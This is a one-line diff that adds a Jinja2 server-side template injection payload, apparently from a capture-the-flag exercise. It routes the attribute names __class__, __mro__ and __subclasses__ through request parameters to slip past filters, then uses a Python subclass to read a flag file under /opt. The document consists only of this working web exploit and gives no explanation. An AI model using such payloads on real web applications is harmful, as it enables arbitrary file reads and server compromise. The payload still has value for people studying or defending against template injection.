@@ -1,0 +1,1 @@
+{{''[request.args.a][request.values.b][2][request.values.c]()[40]('/opt/flag_1234qwerty.txt').read()}}?a=__class__&b=__mro__&c=__subclasses__
